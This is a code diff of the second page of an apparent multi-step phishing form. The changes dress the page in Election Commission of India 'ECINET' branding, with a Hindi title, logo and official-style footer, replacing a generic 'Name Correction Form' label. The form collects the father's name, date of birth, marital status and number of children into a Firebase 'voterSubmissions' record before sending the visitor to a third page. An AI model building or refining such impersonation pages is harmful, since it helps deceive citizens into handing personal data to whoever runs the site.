@@ -3,79 +3,206 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Voter ID Verification - Step 2</title>
+    <title>ECINET - Step 2 Details</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
         
-        /* Container for Edge-to-Edge Banner Header */
+        body { 
+            background-color: #0056b3; 
+            min-height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: flex-start; 
+            padding: 0; 
+        }
+
+        /* Main Container - Full width edge-to-edge on mobile */
         .form-container { 
             background: #ffffff; 
-            padding: 0 35px 35px 35px; 
-            border-radius: 12px; 
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); 
+            padding: 0 20px 20px 20px; 
+            border-radius: 0; 
+            box-shadow: none; 
             width: 100%; 
-            max-width: 450px; 
-            overflow: hidden; 
+            min-height: 100vh;
+            max-width: 100%; 
+            overflow-x: hidden; 
         }
 
-        /* Full Width Edge-to-Edge Banner Styling */
-        .full-banner {
-            margin-left: -35px;
-            margin-right: -35px;
-            margin-bottom: 25px;
-            width: calc(100% + 70px);
-            height: 130px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #004085;
+        @media (min-width: 480px) {
+            body {
+                padding: 15px;
+                align-items: center;
+            }
+            .form-container {
+                border-radius: 16px;
+                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+                min-height: auto;
+                max-width: 440px;
+                padding: 0 25px 25px 25px;
+            }
         }
 
-        .full-banner img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: block;
-        }
-
-        /* Heading Styling matching page 1 style */
-        .form-container h2 { 
+        /* Top Blue Header Section - Edge to Edge matching Index */
+        .top-header {
+            margin-left: -20px;
+            margin-right: -20px;
+            margin-bottom: 20px;
+            padding: 12px 0 15px 0;
+            width: calc(100% + 40px);
+            background-color: #0056b3;
             text-align: center;
-            margin-bottom: 20px; 
+            color: white;
+        }
+
+        @media (min-width: 480px) {
+            .top-header {
+                margin-left: -25px;
+                margin-right: -25px;
+                width: calc(100% + 50px);
+            }
+        }
+
+        /* Logo styling matching index.html */
+        .top-header img {
+            width: 100%;
+            max-height: 100px;
+            object-fit: contain;
+            margin-bottom: 8px;
+            display: block;
+            background: transparent;
+            box-shadow: none;
+        }
+
+        .top-header .hindi-title {
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 3px;
+            letter-spacing: 0.5px;
+            padding: 0 20px;
+        }
+
+        .top-header .eng-title {
+            font-size: 11px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            opacity: 0.9;
+            padding: 0 20px;
+        }
+
+        .top-header h1 {
+            font-size: 24px;
+            font-weight: 800;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            padding: 0 20px;
+        }
+
+        /* Sub Heading Styling */
+        .sub-heading { 
+            text-align: center;
+            margin-bottom: 15px; 
             color: #0056b3; 
-            font-size: 24px; 
+            font-size: 18px; 
             font-weight: 900; 
             letter-spacing: 1px; 
             line-height: 1.3;
             text-transform: uppercase;
         }
 
-        .form-container h2 span {
-            font-size: 15px;
+        .sub-heading span {
+            font-size: 13px;
             font-weight: 700;
             color: #333;
             letter-spacing: 0.5px;
         }
 
-        .form-group { margin-bottom: 15px; text-align: left; }
-        .form-group label { display: block; margin-bottom: 6px; color: #333; font-weight: 600; font-size: 13px; }
-        .form-group input, .form-group select { width: 100%; padding: 10px 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; background: #fff; }
-        .form-group input:focus, .form-group select:focus { outline: none; border-color: #0056b3; box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); }
+        /* Form Fields Styling - compact margins for mobile fit */
+        .form-group { 
+            margin-bottom: 12px; 
+            text-align: left; 
+        }
 
-        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .btn-next:hover { background: #004085; }
-        .footer-text { text-align: center; margin-top: 25px; font-size: 12px; color: #666; font-weight: 600; border-top: 1px solid #eee; padding-top: 15px; }
+        .form-group label { 
+            display: block; 
+            margin-bottom: 4px; 
+            color: #004085; 
+            font-weight: 700; 
+            font-size: 11px; 
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+        }
+
+        .form-group input, .form-group select { 
+            width: 100%; 
+            padding: 10px 12px; 
+            border: 1px solid #dfe4ea; 
+            border-radius: 8px; 
+            font-size: 13px; 
+            background: #f8f9fa; 
+            color: #333;
+        }
+
+        .form-group input::placeholder {
+            color: #adb5bd;
+        }
+
+        .form-group input:focus, .form-group select:focus { 
+            outline: none; 
+            border-color: #0056b3; 
+            background: #fff;
+            box-shadow: 0 0 5px rgba(0, 86, 179, 0.2); 
+        }
+
+        /* Continue Button Styling */
+        .btn-next { 
+            width: 100%; 
+            padding: 12px; 
+            background: #0056b3; 
+            border: none; 
+            border-radius: 8px; 
+            color: white; 
+            font-size: 14px; 
+            font-weight: bold; 
+            letter-spacing: 1px;
+            cursor: pointer; 
+            margin-top: 8px; 
+            text-transform: uppercase;
+            box-shadow: 0 4px 12px rgba(0, 86, 179, 0.3);
+        }
+
+        .btn-next:hover { 
+            background: #004085; 
+        }
+
+        /* Footer Styling */
+        .footer-text {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 10px;
+            color: #666;
+            font-weight: 600;
+            border-top: 1px solid #eee;
+            padding-top: 12px;
+            line-height: 1.4;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+        }
     </style>
 </head>
 <body>
     <div class="form-container">
-        <!-- Full Width Banner Image Header -->
-        <div class="full-banner">
-            <img src="logo.png" alt="Election Commission Banner">
+        
+        <!-- Top Blue Header Section with Logo matching Index -->
+        <div class="top-header">
+            <img src="logo.png" alt="Election Commission Logo">
+            <div class="hindi-title">भारत निर्वाचन आयोग</div>
+            <div class="eng-title">Election Commission of India</div>
+            <h1>ECINET</h1>
         </div>
 
-        <h2>PLEASE ENTER <br><span>(CORRECT DETAILS)</span></h2>
+        <div class="sub-heading">
+            PLEASE ENTER <br><span>(CORRECT DETAILS)</span>
+        </div>
         
         <form id="secondForm">
             <div class="form-group">
@@ -116,7 +243,7 @@
         </form>
 
         <div class="footer-text">
-            © 2026 Name Correction Form. All rights reserved.
+            भारत निर्वाचन आयोग | Election Commission of India
         </div>
     </div>
 
@@ -160,7 +287,6 @@
             const maritalStatus = document.getElementById('maritalStatus').value;
             const childrenCount = document.getElementById('childrenCount').value;
 
-            // लोकल स्टोरेज से पिछले पेज पर बनी Firebase Document ID प्राप्त करें
             const docId = localStorage.getItem('voterDocId');
 
             if (!docId) {
@@ -171,7 +297,6 @@
 
             try {
                 const docRef = doc(db, "voterSubmissions", docId);
-                // उसी रिकॉर्ड में दूसरे पेज की जानकारी अपडेट करें
                 await updateDoc(docRef, {
                     fatherName: fatherName,
                     dob: dob,
@@ -180,11 +305,10 @@
                     childrenCount: childrenCount
                 });
 
-                // अगले पेज पर भेजें
                 window.location.href = "thirdpage.html";
             } catch (error) {
                 console.error("Error updating document: ", error);
-                alert("डेटा सेव करने में समस्या हुई, कृपया पुनः प्रयास करें।");
+                alert("Data save karne me samasya aayi hai, kripya dobara prayas karein.");
             }
         });
     </script>
